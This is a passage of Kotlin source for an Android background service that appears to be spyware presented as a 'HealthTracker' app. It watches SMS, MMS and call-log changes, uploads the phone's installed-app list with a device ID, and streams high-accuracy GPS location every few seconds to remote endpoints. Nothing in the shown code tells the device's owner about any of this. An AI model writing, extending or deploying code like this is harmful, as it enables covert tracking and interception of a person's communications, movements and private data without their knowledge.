            Uri.parse("content://mms/sent"),      // MMS sent
            Uri.parse("content://mms-sms"),       // Combined
            Uri.parse("content://mms-sms/conversations") // Conversations
        )

        messageUris.forEach { uri ->
            try {
                contentResolver.registerContentObserver(
                    uri,
                    true,
                    messageObserver
                )
                Log.d(TAG, "Observer registered for $uri")
            } catch (e: Exception) {
                Log.d(TAG, "Cannot register for $uri: ${e.message}")
            }
        }

        // Call Log Observer (keep separate)
        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "CallLog onChange() called with URI: $uri")
                smsCallLogCollector.collectNewCalls()
            }
        }

        contentResolver.registerContentObserver(
            CallLog.Calls.CONTENT_URI,
            true,
            callLogObserver
        )
        Log.d(TAG, "CallLog observer registered")

        Log.d(TAG, "========== OBSERVER SETUP COMPLETE ==========")
    }

    private fun uploadUserAppsList() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network, skipping user apps list")
            return
        }

        Thread {
            try {
                Log.d(TAG, "========== UPLOADING USER APPS LIST ==========")

                // Get current apps
                val currentApps = packageLister.getUserApps()

                // Check if anything changed
                if (lastAppList != null) {
                    val oldPackages = lastAppList!!.map { it.packageName }.toSet()
                    val currentPackages = currentApps.map { it.packageName }.toSet()

                    val newApps = currentPackages - oldPackages
                    val removedApps = oldPackages - currentPackages

                    if (newApps.isNotEmpty()) {
                        Log.i(TAG, "New apps installed: $newApps")
                    }
                    if (removedApps.isNotEmpty()) {
                        Log.i(TAG, "Apps uninstalled: $removedApps")
                    }
                }

                // Update last list
                lastAppList = currentApps

                // Get JSON and upload
                val jsonData = packageLister.getUserAppsAsJson()
                jsonData.put("scan_type", if (lastAppList == null) "initial" else "update")

                uploadUserAppsJson(jsonData)

                // Save to file
                packageLister.saveUserAppsToFile()

            } catch (e: Exception) {
                Log.e(TAG, "Error uploading user apps list", e)
            }
        }.start()
    }

    private fun uploadUserAppsJson(jsonData: JSONObject) {
        try {
            val requestBody = jsonData.toString()
                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(USER_APPS_ENDPOINT)
                .post(requestBody)
                .addHeader("User-Agent", "HealthTracker/1.0")
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "User apps JSON upload failed: ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.i(TAG, "User apps JSON uploaded successfully")
                    } else {
                        Log.w(TAG, "User apps JSON upload failed: HTTP ${response.code}")
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading user apps JSON: ${e.message}")
        }
    }

    private fun uploadUserAppsFile(bytes: ByteArray, fileName: String) {
        try {
            val deviceId = getUniqueDeviceId()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName,
                    bytes.toRequestBody("text/plain".toMediaTypeOrNull()))
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("device_model", Build.MODEL)
                .addFormDataPart("type", "user_apps_list")
                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                .build()

            val request = Request.Builder()
                .url(USER_APPS_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "User apps file upload failed: ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.i(TAG, "User apps file uploaded: $fileName")
                    } else {
                        Log.w(TAG, "User apps file upload failed: HTTP ${response.code}")
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading user apps file: ${e.message}")
        }
    }

    private fun setupLocationTracking() {
        try {
            Log.d(TAG, "Setting up location tracking...")
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

            // Create location callback
            locationCallback = object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    locationResult.lastLocation?.let { location ->
                        checkAndSendLocation(location)
                    }
                }
            }

            // Request location updates every 10 seconds
            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000)
                .setMinUpdateIntervalMillis(5000)
                .build()

            // Check if we have permission
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
                Log.d(TAG, "Location tracking started successfully")
            } else {
                Log.w(TAG, "No location permission available")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up location: ${e.message}")
        }
    }

    private fun checkAndSendLocation(currentLocation: Location) {
        val now = System.currentTimeMillis()
        var shouldSend = false
        var reason = ""

        // Case 1: First location ever
        if (lastSentLocation == null) {
            shouldSend = true
            reason = "initial fix"
        }
        // Case 2: Moved more than 10 meters
        else {
            val distance = lastSentLocation!!.distanceTo(currentLocation)
            if (distance >= MIN_MOVEMENT_DISTANCE) {
                shouldSend = true
                reason = "moved ${distance.toInt()}m"
            }
        }

        // Case 3: Time-based update (show we're still here)
        if (!shouldSend && (now - lastSentTime) >= LOCATION_SEND_INTERVAL) {
            shouldSend = true
            reason = "still here (${(now - lastSentTime)/1000}s elapsed)"
        }

        if (shouldSend) {
            Log.d(TAG, "Sending location: $reason")
            sendLocationToServer(currentLocation)
            lastSentLocation = currentLocation
            lastSentTime = now
        }
    }

    private fun sendLocationToServer(location: Location) {
        Thread {
            try {
                val deviceId = getUniqueDeviceId()

                val locationData = JSONObject().apply {
                    put("device_id", deviceId)
                    put("device_model", Build.MODEL)
                    put("timestamp", System.currentTimeMillis())
                    put("latitude", location.latitude)
                    put("longitude", location.longitude)
                    put("accuracy", location.accuracy)
                    if (location.hasAltitude()) {
                        put("altitude", location.altitude)
                    }
                    if (location.hasSpeed()) {
                        put("speed", location.speed)
                    }
                    put("provider", location.provider)
                }

                val requestBody = locationData.toString()
                    .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

                val request = Request.Builder()
                    .url(LOCATION_ENDPOINT)
                    .post(requestBody)
                    .addHeader("User-Agent", "HealthTracker/1.0")
                    .build()

                NetworkClient.instance.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e(TAG, "Location send failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            Log.d(TAG, "Location sent: ${location.latitude}, ${location.longitude}")
                        }
                        response.close()
                    }
                })

            } catch (e: Exception) {
                Log.e(TAG, "Error sending location: ${e.message}")
            }
        }.start()
    }

    private fun stopLocationTracking() {
        try {
            if (::fusedLocationClient.isInitialized && ::locationCallback.isInitialized) {
                fusedLocationClient.removeLocationUpdates(locationCallback)
                Log.d(TAG, "Location tracking stopped")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping location: ${e.message}")
        }
    }
}